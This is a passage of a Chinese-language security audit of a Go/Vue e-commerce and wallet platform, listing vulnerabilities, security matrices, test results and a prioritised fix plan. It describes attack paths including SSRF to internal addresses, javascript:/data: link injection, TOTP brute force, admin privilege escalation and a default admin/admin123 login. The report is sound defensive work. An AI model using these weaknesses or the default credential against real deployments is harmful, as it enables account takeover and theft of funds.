- **Recommended Fix:** `support_attachments` 表增加 `uploader_user_id`，`UploadAttachment` 落库时写入当前 user_id；`linkAttachmentsToMessage` 校验 `att.UploaderUserID == currentUser`；未关联附件加 TTL 清理。

---

#### ISSUE-016
- **Severity: P2**
- **Title:** 工单附件场景名 `support_ticket` 不在上传场景白名单，被归一化为 `common`，导致私有附件被公开静态可下载
- **File:** `internal/modules/upload/application/service.go:25-34,180-189`；`internal/app/container/services_application.go:304`；`internal/app/httpserver/router.go:323-328`
- **API:** 用户侧工单附件上传；公开静态 `GET /uploads/common/*`
- **Table:** `support_ticket_attachments`
- **Root Cause:** `allowedUploadScenes` 只包含 product/post/banner/editor/common/category/telegram/reseller，**不包含 `support_ticket`**。工单上传器调用 `SaveFileWithMeta(file, "support_ticket")`，`normalizeUploadScene` 对未知场景一律回退 `"common"`。附件实际落盘为 `uploads/common/...`，而 router.go:325 的私有阻断只匹配 `/uploads/support_ticket/` 前缀——前缀永不出现，阻断成为死代码。
- **Impact:** 本应私有、需归属校验的工单附件被公开静态可下载。文件名是 UUID v4 具备"不可猜测性"，但一旦 URL 泄露（日志/Referer/预览/转发）即泄露敏感 PII。
- **Recommended Fix:** 把 `support_ticket` 加入 `allowedUploadScenes`，使附件真正落到 `uploads/support_ticket/`；或更稳妥：工单附件不落公共 `uploads/` 静态目录，改放私有目录，仅经鉴权 filer 读取。

---

#### ISSUE-017
- **Severity: P2**
- **Title:** 多处出站 HTTP 未走 safe dial（SSRF 防护不一致），管理员配置的 URL 可访问内网/云元数据
- **File:**
  - `internal/modules/siteconnection/application/service.go:81`；`internal/upstream/dujiao_next.go:63-65`（站点对接 BaseURL / Ping）
  - `internal/app/jobs/consumer/consumer_bot.go:104`（Bot 通知 → channel_clients.callback_url）
  - `internal/modules/payment/infrastructure/gateway/*`（各支付网关 adapter 自建 http.Client）
- **API:** `POST /api/v1/admin/site-connections`、`POST /api/v1/admin/site-connections/:id/ping`；内部 Asynq worker；支付网关配置
- **Table:** `site_connections.base_url`、`channel_clients.callback_url`、`payment_channels.gateway_url`
- **Root Cause:** 这些 URL 由管理员在后台填写，代码用默认 `http.Client` 直连，未复用 `downstreamcallback/infrastructure/callbackclient/transport.go` 已实现的 safeDialContext（拦截 127.0.0.1/10.x/172.16-31.x/192.168.x/169.254.x/::1）。项目在下游回调链路已有防护，但上游适配器/Bot 通知/支付网关三条链路没有复用。
- **Impact:** 已认证 integration/operations 管理员可借服务器向内网/云元数据地址发起请求。属于防护不一致导致的内网探测面。
- **Recommended Fix:** 抽出共享的 `newSafeHTTPClient()`，所有配置型出站 HTTP（bot 通知、upstream adapter、payment gateway、siteconnection ping）统一复用；对 callback_url/base_url/gateway_url 做 scheme/host 校验 + 内网 IP 拦截 + DNS rebinding 防护。

---

#### ISSUE-018
- **Severity: P2**
- **Title:** 站点装修外链字段无 URL 协议白名单，`:href` 可渲染 `javascript:` / `data:`
- **File:** `frontend/user/src/views/Discovery.vue:307-313`；`frontend/user/src/components/home/HomeExperience.vue`；`frontend/user/src/views/About.vue`；`frontend/user/src/utils/siteConfig.ts:91-94`
- **API:** `GET /api/v1/public/config`（discovery_blocks / home_entries / banners）
- **Root Cause:** `resolveBlockLink` 对 `link_type === 'external'` 直接返回 `{ external: true, href: link_value }`，**不校验协议**；external_link 区块的 `config.url`、首页 home_entries 的外链全部原样绑定到 `:href`。Vue 3 不对 `:href` 做协议消毒。后端 Banner/Discovery 的 external 类型已 fail-closed 仅允许 http/https，但 internal 类型只校验非空（见 ISSUE-024），且前端 resolveBlockLink 对 external 也不校验。
- **Impact:** 现代 Chrome/Firefox 对 `target="_blank"` 的 `javascript:` 已拦截，实际可利用性下降；但 `data:text/html` 仍可在新标签页打开钓鱼页面；旧内核/WebView 仍可能执行 `javascript:`。
- **Recommended Fix:** 对所有外链统一加白名单 `^https?:\/\/`（mailto: 除外），非白名单降级为 `#`；在 `normalizeHomeEntries` / `resolveBlockLink` 层统一过滤。

---

#### ISSUE-019
- **Severity: P2**
- **Title:** JWT（admin_token / user_token）存储在 localStorage，任何 XSS 即可全量窃取会话
- **File:** `frontend/admin/src/stores/auth.ts:10,109,132,195`；`frontend/user/src/stores/userAuth.ts:9,31,42`；`frontend/admin/src/api/client.ts:113-116`；`frontend/user/src/api/client.ts:96-99`
- **API:** 全部 `/api/v1/**`
- **Root Cause:** 登录成功后 `localStorage.setItem('admin_token', token)` / `localStorage.setItem('user_token', token)`，请求时 `headers['Authorization'] = Bearer ${token}`。localStorage 同源可读，任何一处 XSS（如 ISSUE-007、ISSUE-006）即可全量外带。
- **Impact:** 会话失窃 → 用户资产（钱包/C2C/订单）与管理端全部权限沦陷。logout/401 时 token 清理正确，问题仅在存储介质选择。
- **Recommended Fix:** 中长期改为 HttpOnly + Secure + SameSite=Lax Cookie 下发 refresh token，localStorage 只放短期内存态 access token；短期必须保证 XSS 面（ISSUE-006/007/018）归零。

---

### P3 — Low（20 项，摘要）

| ID | 标题 | 文件位置 |
|----|------|----------|
| ISSUE-020 | 钱包管理员调账幂等冲突返回 500 而非 409（私有 sentinel 比对错误） | `wallet/transport/http/admin_handler.go:27,398` |
| ISSUE-021 | money.Amount 解析 JSON 数字经 float64 中间态（已被 Round(2) 收敛） | `internal/shared/money/amount.go:44-48` |
| ISSUE-022 | 管理员人工调账/退款无单笔/单日上限与双人复核（内部威胁） | `wallet/application/admin.go`；`order/application/refund/wallet.go` |
| ISSUE-023 | 管理员退款未显式校验订单主状态，仅依赖 PaidAt+累计上限 | `order/application/refund/service.go:379-397` |
| ISSUE-024 | Banner/发现页 internal 类型链接值未做协议白名单校验（javascript: 依赖前端兜底） | `content/application/banner_service.go:156-163`；`sitebuilder/application/discovery_schema.go:160-164` |
| ISSUE-025 | 通用 `GET /admin/settings?key=` 原样返回任意配置项，绕过专用脱敏接口 | `settings/transport/http/admin_handler.go:42-54` |
| ISSUE-026 | TOTP 未做"用过即废"的 code 级防重放（仅靠 challenge jti 单次消费） | `identity/adminauth/totp/application/service.go` |
| ISSUE-027 | 默认 server.mode=debug，captcha 默认全关 | `config/config.go:319,407-412` |
| ISSUE-028 | 管理员改用户邮箱不吊销该用户现有 token | `identity/user/transport/http/admin/admin_handler.go:402-421,487-490` |
| ISSUE-029 | 用户端提现创建接口无 HTTP 层速率限制 | `app/httpserver/routes_storefront.go`（withdrawal 路由未包 RateLimit） |
| ISSUE-030 | C2C trade_no 后缀使用 math/rand 4 位数字（可预测，DB UNIQUE 兜底） | `c2c/application/service.go:97-100` |
| ISSUE-031 | 卡密批次号 batch_no 使用 math/rand（DB UNIQUE 兜底） | `cardsecret/application/import.go` |
| ISSUE-032 | 上游回调失败日志记录 api_key（标识非 secret，低风险） | `upstreamapi/transport/http/upstream_callback.go:62,95` |
| ISSUE-033 | safeHTTPClient 仍走 `http.ProxyFromEnvironment`（恶意代理可绕过 dial 层 IP 拦截） | `downstreamcallback/infrastructure/callbackclient/transport.go` |
| ISSUE-034 | 管理后台生产构建未 drop console/debugger（错误信息残留线上包） | `frontend/admin/vite.config.ts` |
| ISSUE-035 | 媒体库上传前端仅校验大小不校验类型/扩展名 | `frontend/admin/src/views/admin/Media.vue:135,259`；`frontend/admin/src/utils/upload.ts:13-24` |
| ISSUE-036 | 公告弹窗 DOMPurify 白名单放行 `style` 属性（CSS 注入面） | `frontend/user/src/components/AnnouncementModal.vue:29-34` |
| ISSUE-037 | 管理后台前端路由权限为 localStorage 缓存的 advisory 校验，可被本地篡改绕过（后端必须强制） | `frontend/admin/src/router/index.ts:522-555`；`frontend/admin/src/stores/auth.ts:160-181` |
| ISSUE-038 | 管理端 Settings 残留"自定义 JS 注入"表单（已 v-show=false 隐藏，数据仍回写 site_config） | `frontend/admin/src/views/admin/Settings.vue:1063-1123` |
| ISSUE-039 | 退款入钱包 reference 使用时间戳，未要求客户端幂等键（已被行锁+累计上限缓解） | `order/application/refund/wallet.go:91` |

---

## 7. SQL Injection Matrix

| Input | Endpoint | SQL Path | Bound | Whitelist | Result |
|-------|----------|----------|-------|-----------|--------|
| 订单关键词搜索 | 管理后台订单列表 | `order/infrastructure/gormstore/order_store.go` GORM `Where("... LIKE ?", kw)` | 是 | — | **SAFE** |
| 仪表盘 locale 字段 | dashboard SQL | `dashboard/infrastructure/gormstore/sql.go` `fmt.Sprintf("...->>'$.%s'", locale)` | 参数值绑定 | locale ∈ `SupportedLocales` 常量集 | **SAFE** |
| 工单搜索 keyword | supportticket | `supportticket/infrastructure/gormstore/ticket_store.go` `.Where("... LIKE ?", kw)` | 是 | — | **SAFE** |
| 游客密码迁移候选 | order backfill | `order_store.go:164` `guestCredentialBackfillCandidateSQL` | LIKE/GLOB 参数绑定 | 长度/偏移为编译期常量 | **SAFE** |
| 动态排序 sort/order | 全部 `.Order(...)` 调用 | 全项目 grep | — | 全部硬编码字符串（如 `"orders.created_at DESC"`），无用户输入拼接 | **SAFE** |
| 动态表名/列名 | GORM 调用 | 全项目 grep | — | 未发现用户可控 table/column | **SAFE** |
| IN / LIMIT / OFFSET | 分页 | GORM `Limit/Offset` 绑定为整数 | 是 | — | **SAFE** |

**结论：未发现 SQL 注入。** 全项目 GORM 参数全部绑定；动态排序/字段全部硬编码；唯一一处 `fmt.Sprintf` 拼接（dashboard locale）有常量集白名单兜底。

---

## 8. Authorization Matrix（重点 admin 端点）

| Endpoint | Auth | Ownership | RBAC | Step-Up | Result |
|----------|------|-----------|------|---------|--------|
| POST /admin/login | 否（公网） | - | - | - | 限流+可选验证码 ✅ |
| POST /admin/login/verify-2fa | challenge token | - | - | challenge 单次消费 | 5 次失败吊销 ✅ |
| POST /admin/auth/step-up | Admin JWT | - | 无策略命中(仅超管可用) | 是(TOTP) | **无限流/失败计数 ISSUE-005** |
| POST /admin/authz/admins | Admin JWT | - | system_admin | 否 | **可指定 is_super ISSUE-004** |
| PUT /admin/authz/admins/:id | Admin JWT | - | system_admin | 否 | **可自提为超管 ISSUE-004** |
| POST /admin/users/:id/wallet/adjust | Admin JWT | - | finance | 是(scope wallet.adjust) | 资金操作有 step-up ✅ |
| POST /admin/wallet/withdrawals/:id/approve | Admin JWT | - | finance | 是 | ✅ |
| POST /admin/orders/:id/manual-refund | Admin JWT | - | finance | 是 | ✅ |
| POST /admin/c2c/orders/:id/arbitrate | Admin JWT | - | authorized | 弱(无scope/不消费) | **ISSUE-012** |
| PUT /admin/users/:id | Admin JWT | - | support | 否 | 可改任意用户密码/邮箱/冻结；改密即吊销 ✅ |
| GET /admin/settings?key= | Admin JWT | - | system_admin | 否 | **原样返回未脱敏 ISSUE-025** |
| POST /admin/upload | Admin JWT | - | operations | 否 | **scene=telegram 绕过白名单 ISSUE-006** |
| POST /admin/site-connections | Admin JWT | - | integration | 否 | **SSRF ISSUE-017** |

**用户端 ownership 验证结论：** 全部 `{id}` 端点在 Service 层用 `WHERE id = ? AND user_id = ?` 或 `x.UserID != currentUser` 做了归属校验。订单/钱包/提现/C2C/通知/积分/积分商城/分销商/API 凭证均确认 ownership 生效。唯一缺陷为工单附件（ISSUE-015）。

---

## 9. Money Safety Matrix

| Flow | Transaction | Row Lock | Idempotency | DB Constraint | Result |
|------|-------------|----------|-------------|---------------|--------|
| 创建订单 | 是（uow.WithinTransaction） | cardsecret FOR UPDATE / coupon FOR UPDATE | 业务预检 + fingerprint | orders(user_id,idempotency_key) partial UNIQUE | **SAFE** |
| 钱包扣款(下单支付) | 是（payment tx 内） | account FOR UPDATE | reference=`order:{id}:wallet_pay` | wallet_transactions.reference UNIQUE | **SAFE**（并发双扣被行锁串行化） |
| 在线支付回调 | 是 | payment+order FOR UPDATE | 已 success 直接返回 | payment 状态机 | **SAFE**（验签+金额==订单额） |
| 退款(累计上限) | 是 | order FOR UPDATE | refunded_amount 累计 | orders.refunded_amount | **SAFE**（60+60 被第二笔拒绝） |
| 退款入钱包 | 是（order tx 内） | order + wallet | 时间戳 reference | wallet_transactions.reference UNIQUE | **SAFE**（行锁+累计上限兜底，ISSUE-039） |
| 佣金发放/回滚 | 是 | commissions FOR UPDATE | (order,beneficiary,level,type) 唯一 | affiliate_commissions 唯一 | **SAFE** |
| 用户提现 | 是 | account FOR UPDATE + withdrawal FOR UPDATE | 强制 Idempotency-Key + reference 预检 | wallet_transactions.reference UNIQUE | **SAFE** |
| 提现拒绝退款 | 是 | withdrawal → account FOR UPDATE | refundReference(w.ID) 确定性 | wallet_transactions.reference UNIQUE | **SAFE** |
| 管理员调账 | 是（changeBalance 内 tx） | account FOR UPDATE | Idempotency-Key header 派生 reference | wallet_transactions.reference UNIQUE | **SAFE**（错误码 ISSUE-020） |
| 礼品卡兑换 | 是（RedeemTransaction） | card FOR UPDATE | reference=`gift_card:{id}` | wallet_transactions.reference UNIQUE | **SAFE** |

---

## 10. State Machine Matrix

### 订单主状态（ordermachine + allowedTransitions）

| from \ to | pending_payment | paid | completed | failed | canceled | refunded |
|-----------|-----------------|------|-----------|--------|----------|----------|
| pending_payment | — | ✅ | ❌ | ❌ | ✅ | ❌ |
| paid | ❌ | — | ✅ | ✅ | ❌ | ✅ |
| completed | ❌ | ❌ | — | ❌ | ❌ | ✅(退款) |
| failed | ❌ | ❌ | ❌ | — | ❌ | ❌ |
| canceled | ❌ | ❌ | ❌ | ❌ | — | ❌ |

- 非法跳转（completed→processing、canceled→completed、failed→refund）被 `CanTransition` 拒绝
- Controller 不直接改 status，一律经 Service 状态机
- **注意 ISSUE-023**：管理员退款未显式校验订单主状态，仅依赖 PaidAt+累计上限，建议补一行状态判断

### 退款状态 refund_status
- none → partial → full（由 refunded_amount 与 paidBase 比较驱动：`markRefunded = newRefunded >= paidBase`）

### 提现状态机

| from \ to | approved | rejected | canceled | processing | completed |
|-----------|----------|----------|----------|------------|-----------|
| pending | ✅ | ✅ | ✅ | ❌ | ❌ |
| approved | ❌ | ✅ | ❌ | ✅ | ❌ |
| processing | ❌ | ✅ | ❌ | ❌ | ✅ |
| completed/rejected/canceled | 终态，无出边 | | | | |

- 自跳转（from==to）一律 false，重复审批被拒

---

## 11. Tests（真实执行结果）

| 命令 | 结果 | 详情 |
|------|------|------|
| `go build ./...` | **FAIL** | `internal/modules/points/transport/http/routes.go:35:52: h.CompensateUserPoints undefined`；`points/infrastructure/gormstore/store.go:19: *Store missing ListAccounts`。exit 1。 |
| `go vet ./...` | **FAIL** | 同上 points 包编译错误，exit 1。 |
| `go test ./internal/modules/wallet/...` | **PASS** | 全部 ok（integrationtest / transport/http 18.5s） |
| `go test ./internal/modules/order/...` | **PASS** | application / aftersale / e2e / refund / gormstore 全部 ok |
| `go test ./internal/modules/c2c/...` | **PASS** | integrationtest ok 21.6s |
| `go test ./internal/modules/payment/...` | **PASS** | 全部 gateway adapter / gormstore / integrationtest ok |
| `go test ./internal/bootstrap/...` | **FAIL** | `bootstrap/points [build failed]`（同 ISSUE-003）；migrations 包本身 ok 61.6s；其余 ok |
| `go test -race ./...` | **SKIPPED** | 因 points 包编译失败，全量 -race 无法运行 |
| `govulncheck` | **NOT VERIFIED** | 环境未确认可用 |
| 前端 npm audit / typecheck / lint / build | **SKIPPED** | npmmirror 不支持 audit 端点；未执行 npm install（遵守零改动约束） |

> 测试均使用 `file:<name>?mode=memory&cache=shared` 内存 SQLite，未读写 `db/hcz.db`。资金核心模块（wallet / order / c2c / payment / migrations）的单元与集成测试全部 PASS。

---

## 12. Top Risks（TOP 10 最危险问题）

| 排名 | ID | 级别 | 标题 | 核心风险 |
|------|-----|------|------|----------|
| 1 | ISSUE-001 | P0 | 硬编码默认 JWT 密钥 | 未改配置即上线 → 任何人伪造超管 token → 完全失守 |
| 2 | ISSUE-002 | P0 | 默认 admin/admin123 | 批量扫站直接登录超管 |
| 3 | ISSUE-003 | P0 | points 编译失败 | 项目无法构建部署，CI 全红 |
| 4 | ISSUE-004 | P1 | system_admin 自提超管 | 低权限管理员账号被盗 → 全量失守 |
| 5 | ISSUE-006 | P1 | telegram 上传绕过白名单 | 运营账号可上传 HTML → 同源存储型 XSS/钓鱼托管 |
| 6 | ISSUE-007 | P1 | JSON-LD `</script>` 逃逸 | 商品名投毒 → 所有访客 XSS → token 窃取 |
| 7 | ISSUE-005 | P1 | Step-Up 无限流可爆破 TOTP | 已有 access token 时可爆破第二因子 → 资金操作 |
| 8 | ISSUE-008 | P1 | config.yml 含真实密钥 | 部署包/服务器被读 → 伪造 JWT + 默认口令登录 |
| 9 | ISSUE-015 | P2 | 工单附件跨用户读取 | 枚举附件 ID → 下载他人身份证/支付截图 |
| 10 | ISSUE-017 | P2 | 出站 HTTP SSRF 防护不一致 | 管理员配置 URL → 探测内网/云元数据 |

---

## 13. Fix Order（推荐修复顺序）

### 第一阶段：P0 阻断修复（必须先做，否则无法部署/上线即失守）

1. **ISSUE-003** — 修复 points 包编译失败（补 `CompensateUserPoints` 方法 + `ListAccounts` 实现），重跑 `go build ./... && go vet ./... && go test ./...` 全绿。
2. **ISSUE-001** — 生产模式启动时强制校验 JWT 密钥不得为默认值/空/短于 32 字节，否则 panic；删除源码中的默认密钥。
3. **ISSUE-002** — 首启未配置口令时随机生成一次性强密码并仅打印一次；登录后强制改密。
4. **ISSUE-008** — 轮换当前 config.yml 中的 secret_key / jwt.secret / user_jwt.secret；生产环境通过环境变量注入，禁止 config.yml 入镜像。

### 第二阶段：P1 资金与权限修复

5. **ISSUE-004** — Create/UpdateAuthzAdmin 中设置 is_super 前必须校验调用方 IsSuper；把"任命超管"收归超管专属。
6. **ISSUE-005** — Step-Up 端点挂 RateLimitMiddleware + 失败计数吊销 challenge。
7. **ISSUE-006** — 管理端上传固定 scene=common，拒绝 scene=telegram；静态服务对 .html/.htm 强制下载。
8. **ISSUE-007** — JSON-LD 序列化后 `.replace(/</g, '\\u003c')`；后端对商品名 `</` 序列做拒绝。

### 第三阶段：P1 配置 + P2 越权/SSRF

9. **ISSUE-012** — C2C 仲裁改用统一 stepup.Verifier（scope 绑定 + challenge 消费）。
10. **ISSUE-015** — support_attachments 表加 uploader_user_id，linkAttachmentsToMessage 校验归属。
11. **ISSUE-016** — support_ticket 加入上传场景白名单，或改放私有目录。
12. **ISSUE-017** — 抽出共享 newSafeHTTPClient，所有配置型出站 HTTP 统一复用（siteconnection/bot/payment gateway/upstream）。
13. **ISSUE-009** — CORS 生产环境收敛到具体域名白名单，allow_credentials=true 时拒绝 `*`。
14. **ISSUE-014** — API secret 改 AES-256-GCM 加密存储。

### 第四阶段：P2 纵深防御 + P3 清理

15. ISSUE-010/011 — 登录错误统一文案 + 纯 IP 维度全局限流 + 账号失败锁定。
16. ISSUE-013 — 增加服务端 logout（jti 黑名单或 bump TokenVersion）。
17. ISSUE-018/019 — 前端外链协议白名单 + 中长期 token 改 HttpOnly Cookie。
18. ISSUE-020~039 — 按 P3 清单逐项排期（错误码修复、状态校验补全、math/rand 替换 crypto/rand、console drop、DOMPurify style 移除等）。

---

## 附录 A：已验证为安全的控制项（正面确认）

- **金额精度**：所有金额列均为 `decimal(20,2)`（shopspring/decimal），未发现 float32/float64 存金额
- **金额不可客户端伪造**：下单请求体无 price/amount/exchange_rate/discount 字段，OrderItemRequest 仅 product_id/sku_id/quantity
- **并发双扣**：钱包扣减一律 `SELECT FOR UPDATE` 行锁 + `after<0` 拒绝
- **退款累计上限**：服务端强制 `refundable = paidBase - refundedBefore`，不可能退 120
- **支付回调防伪造**：先验签再强校验 amount==payment.Amount、订单号、渠道、币种
- **幂等**：wallet_transactions.reference UNIQUE、orders.order_no UNIQUE、orders(user_id,idempotency_key) partial UNIQUE、c2c_trades.idempotency_key UNIQUE
- **佣金回滚**：按比例 REVERSAL ledger，已出金转 DEBT
- **JWT**：仅 HS256（无 alg=none 面），admin/user 双密钥隔离，冻结即拒，改密 bump TokenVersion
- **密码**：bcrypt(DefaultCost)，dummy hash 防时序，无 MD5/SHA1
- **TOTP**：登录 challenge 单次消费 + 5 次失败吊销，恢复码 bcrypt 存储单次使用
- **RBAC**：Casbin 默认拒绝 + 角色矩阵 + 内置角色不可改，超管中间件层短路
- **Admin 路由覆盖**：除 login/verify-2fa（限流）外，所有 /api/v1/admin/* 都挂 JWT+RBAC
- **用户端 ownership**：全部 {id} 端点在 Service 层 WHERE user_id 校验（除工单附件 ISSUE-015）
- **无 Mass Assignment**：全仓 0 命中 BindJSON(&model) 反模式，写接口全用显式 DTO
- **SQL 注入**：未发现（全参数绑定，动态排序硬编码）
- **密钥落库加密**：site_connections.api_secret、channel_clients.channel_secret/bot_token 均 AES-256-GCM
- **随机数**：邀请码用 crypto/rand；math/rand 仅用于非安全业务号（c2c trade_no、cardsecret batch_no）
- **事务锁顺序**：按 user_id 升序加锁，无 wallet↔order 死锁
- **Recovery**：panic 仅写服务端日志（stack 入 zap），不回吐客户端
- **Self-update**：强制 https + 主机白名单 + sha256 checksum
- **SVG 上传**：XML token 解析器 + 静态强制下载双重防护
- **Git 历史**：config.yml 未被跟踪，历史无真实 secret 泄露

## 附录 B：NOT VERIFIED 清单（禁止视为安全）

- procurement 上游回调的金额对账细节（疑似由 poll.go 主动轮询驱动，公网 webhook 入口未确认）
- reconciliation（对账）模块的自动匹配/差异处理逻辑
- pricing / profitguard 的利润核算与红线拦截（仅确认金额类型为 decimal）
- cardsecret 卡密发放与订单履约的并发占用状态机
- coupon/promotion 的折扣封顶（discount 是否可能 > total）
- cancel/failed 订单是否同步写 refunded_amount（关系 ISSUE-023 是否真会双计）
- 提现创建 Service 层是否有业务频控（ISSUE-029 仅确认 HTTP 层无限流）
- 生产 config.yml.production 是否已替换默认密钥/口令（建议上线前核对）
- OAuth(Telegram/Google) state 一次性与 replay 是否完整
- Asynq 任务端到端幂等（未跑异步集成测试）
- go test -race 全量（因编译失败 SKIPPED）
- govulncheck 依赖漏洞扫描
- 前端 npm audit / typecheck / lint / build（npmmirror 不支持 audit，未执行 npm install）
- site_config.scripts 是否被后端模板注入（用户端前端已确认 no-op，但后端 SSR 未确认）

---

> **审计声明**：本报告基于 2026-10-07 工作区当前代码的只读静态审计 + 真实编译/测试执行。全程零代码改动。所有结论均附文件路径与行号证据。标注 NOT VERIFIED 的项需后续专项审计，禁止视为安全。资金主链路设计稳健，但部署配置（ISSUE-001/002/008）与编译状态（ISSUE-003）构成当前阻断。
